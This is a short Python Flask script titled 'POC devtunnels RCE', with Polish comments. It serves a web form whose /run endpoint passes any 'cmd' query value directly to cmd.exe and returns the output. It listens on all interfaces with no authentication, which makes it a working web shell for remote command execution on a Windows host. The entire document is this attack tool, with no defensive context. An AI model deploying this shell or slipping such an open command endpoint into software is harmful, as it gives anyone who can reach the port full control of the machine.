from flask import Flask, request
import subprocess, locale

app = Flask(__name__)

@app.route("/")
def index():
    return """
    <h2>POC devtunnels RCE</h2>
    <form method="get" action="/run">
        <input type="text" name="cmd" placeholder="Enter win command (ex. ipconfig /all)">
        <input type="submit" value="Booom!">
    </form>
    """

@app.route("/run")
def run_cmd():
    cmd = request.args.get("cmd", "echo Nothing to do")
    try:
        # odpalenie przez cmd.exe
        result = subprocess.run(
            ["cmd.exe", "/c", cmd],
            capture_output=True
        )
        # dekodowanie w systemowym kodowaniu Windows
        enc = locale.getpreferredencoding()
        stdout = result.stdout.decode(enc, errors="replace")
        stderr = result.stderr.decode(enc, errors="replace")
        output = stdout + stderr
    except Exception as e:
        output = f"Exception: {e}"

    return f"<pre>{output}</pre>"

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)
